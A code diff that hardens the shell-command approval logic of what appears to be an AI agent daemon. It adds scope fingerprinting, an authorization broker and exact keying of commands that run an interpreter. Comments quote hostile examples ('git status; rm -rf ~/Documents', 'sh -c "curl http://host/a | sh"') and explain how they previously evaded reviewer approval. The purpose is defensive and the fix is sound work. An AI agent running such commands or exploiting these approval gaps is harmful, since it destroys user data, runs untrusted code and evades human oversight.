@@ -4,17 +4,55 @@ import * as os from "os";
 import { existsSync } from "fs";
 import type { Workspace, CommandTerminationReason } from "../../../shared/types";
 import type { AgentDaemon } from "../daemon";
-import { GuardrailManager } from "../../guardrails/guardrail-manager";
+import { GuardrailManager, containsShellControlOperator } from "../../guardrails/guardrail-manager";
 import { BuiltinToolsSettingsManager, type RunCommandApprovalMode } from "./builtin-settings";
 import { ShellSessionManager, isLikelyInteractiveCommand } from "./shell-session-manager";
 import { createSandbox } from "../sandbox/sandbox-factory";
 import { loadPolicies, type AdminPolicies } from "../../admin/policies";
 import { createLogger } from "../../utils/logger";
+
 import { isLikelyNetworkShellCommand } from "../../../shared/shell-network";
 import {
+  authorizeToolActionWithFallback,
   evaluateWorkspaceFilesystemAccess,
   hasEffectiveFilesystemScope,
 } from "../../security/access-profile-paths";
+
+/**
+ * Executables whose arguments are code, not data. Approval reuse must never
+ * normalize their arguments — see getCommandSignature.
+ */
+const INTERPRETER_EXECUTABLES = new Set([
+  "sh",
+  "bash",
+  "zsh",
+  "dash",
+  "ksh",
+  "fish",
+  "csh",
+  "tcsh",
+  "cmd",
+  "cmd.exe",
+  "powershell",
+  "powershell.exe",
+  "pwsh",
+  "node",
+  "deno",
+  "bun",
+  "python",
+  "python2",
+  "python3",
+  "perl",
+  "ruby",
+  "php",
+  "osascript",
+  "env",
+  "eval",
+  "xargs",
+  "nohup",
+  "sudo",
+  "doas",
+]);
 
 const log = createLogger("ShellTools");
 
@@ -595,7 +633,44 @@ export class ShellTools {
    * Update the workspace for this tool
    */
   setWorkspace(workspace: Workspace): void {
+    const previousScope = this.getShellAccessScopeFingerprint(this.workspace);
+    const previousWorkspaceId = this.workspace.id;
     this.workspace = workspace;
+    const nextScope = this.getShellAccessScopeFingerprint(workspace);
+    if (previousScope !== nextScope) {
+      // Approval reuse is scoped to the effective policy.  A profile/root
+      // change must not let a command approved under the old scope run under
+      // the new one. Persistent shells carry cwd/env state, so close the old
+      // runtime as well when the session manager exposes that operation.
+      this.recentApprovals.clear();
+      this.bundleApproval = null;
+      const shellSessions = ShellSessionManager.getInstance() as Any;
+      if (typeof shellSessions.closeSession === "function") {
+        void shellSessions.closeSession(this.taskId, previousWorkspaceId);
+      }
+    }
+  }
+
+  private getShellAccessScopeFingerprint(workspace: Workspace): string {
+    const permissions = workspace.permissions || ({} as Workspace["permissions"]);
+    return JSON.stringify({
+      workspaceId: workspace.id,
+      workspacePath: workspace.path,
+      shell: permissions.shell,
+      read: permissions.read,
+      write: permissions.write,
+      delete: permissions.delete,
+      network: permissions.network,
+      accessSandboxMode: permissions.accessSandboxMode,
+      accessApprovalPolicy: permissions.accessApprovalPolicy,
+      sandboxType: permissions.sandboxType,
+      accessNetworkMode: permissions.accessNetworkMode,
+      accessDomainRules: permissions.accessDomainRules,
+      accessWorkspaceRoots: permissions.accessWorkspaceRoots,
+      accessFilesystemRules: permissions.accessFilesystemRules,
+      allowedPaths: permissions.allowedPaths,
+      unrestrictedFileAccess: permissions.unrestrictedFileAccess,
+    });
   }
 
   private getVerificationCommandKey(command: string, cwd: string): string | null {
@@ -1140,7 +1215,35 @@ export class ShellTools {
     const signature = this.getCommandSignature(command);
     const now = Date.now();
 
-    if (!networkRequiresApproval && bundleEligible && this.isBundleApprovalActive(now)) {
+    const typedAuthorizationAvailable =
+      typeof (this.daemon as Any)?.authorizeToolAction === "function";
+
+    if (typedAuthorizationAvailable) {
+      // The daemon is the single execution authority.  In-scope commands are
+      // authorized silently; only a real policy exception reaches its
+      // reviewer.  Local command-pattern heuristics below remain only for
+      // legacy test doubles/embedders that predate the typed broker.
+      approved = await authorizeToolActionWithFallback(this.daemon, this.taskId, {
+        toolName: "run_command",
+        approvalType: "run_command",
+        description: "Review the shell command below before approving.",
+        details: {
+          command,
+          cwd,
+          timeout: options?.timeout || DEFAULT_TIMEOUT,
+          approvalMode,
+          bundleScope: bundleEligible ? "safe_commands_in_this_task" : undefined,
+          network: networkCommand,
+        },
+        // The daemon's auto-approve path matches trusted rules by bare command
+        // prefix, so `git status; rm -rf ~/Documents` matches `git` and is
+        // allowed without ever reaching a reviewer. These two facts are the
+        // same guards the legacy branches below apply; they must gate the
+        // typed path too, or they are dead code in every shipping build.
+        allowAutoApprove: safeForAutoApproval && !networkRequiresApproval,
+        signal: options?.signal,
+      });
+    } else if (!networkRequiresApproval && bundleEligible && this.isBundleApprovalActive(now)) {
       approved = true;
       this.recordBundleApproval(now);
       this.daemon.logEvent(this.taskId, "log", {
@@ -1153,8 +1256,10 @@ export class ShellTools {
         message: "Auto-approved command (user setting enabled)",
         command,
       });
-    } else if (!networkRequiresApproval && trustCheck.trusted) {
-      // Auto-approve trusted commands
+    } else if (!networkRequiresApproval && trustCheck.trusted && safeForAutoApproval) {
+      // Auto-approve trusted commands. `safeForAutoApproval` is required here
+      // for the same reason as the branch above: without it, a command bearing
+      // rm/sudo auto-approved as long as some trusted prefix matched it.
       approved = true;
       this.daemon.logEvent(this.taskId, "log", {
         message: `Auto-approved trusted command (matched: ${trustCheck.pattern})`,
@@ -1604,18 +1709,45 @@ export class ShellTools {
   }
 
   /**
-   * Generate a normalized signature for a command to detect similar repeats
+   * Key for the recent-approval reuse window.
+   *
+   * Two commands that share a signature share an approval, so this is a
+   * security key as well as a convenience: normalizing arguments is what lets
+   * one approval cover a batch (`sips … A.png`, `sips … B.png`) instead of
+   * prompting per file.
+   *
+   * That normalization is unsafe exactly when the argument *is* the program —
+   * `sh -c "npm test"` and `sh -c "curl http://host/a | sh"` collapse to the
+   * same `sh -c "<arg>"`, so approving a test run also auto-approved arbitrary
+   * code for the rest of the window. Commands that chain/pipe, or whose
+   * executable is an interpreter, are therefore keyed verbatim and only ever
+   * match a byte-identical repeat.
    */
   private getCommandSignature(command: string): string {
     if (!command) return "";
-    let signature = command.trim();
-    signature = signature.replace(/\s+/g, " ");
+    const collapsed = command.trim().replace(/\s+/g, " ");
+
+    if (containsShellControlOperator(collapsed) || this.invokesInterpreter(collapsed)) {
+      return collapsed;
+    }
+
+    let signature = collapsed;
     signature = signature.replace(/"(?:[^"\\]|\\.)*"/g, '"<arg>"');
     signature = signature.replace(/'(?:[^'\\]|\\.)*'/g, "'<arg>'");
     signature = signature.replace(/(?:\/Users\/[^\s]+|~\/[^\s]+|\/[^\s]+)/g, "<path>");
     signature = signature.replace(/\b\d+(?:\.\d+)?\b/g, "<num>");
     signature = signature.replace(/\b[A-Za-z0-9_-]{20,}\b/g, "<id>");
     return signature;
+  }
+
+  /**
+   * True when the first word of `command` is a shell or language interpreter,
+   * i.e. when its arguments carry code rather than data.
+   */
+  private invokesInterpreter(command: string): boolean {
+    const first = command.split(" ")[0] || "";
+    const executable = first.replace(/^.*[\\/]/, "").toLowerCase();
+    return INTERPRETER_EXECUTABLES.has(executable);
   }
 
   /**
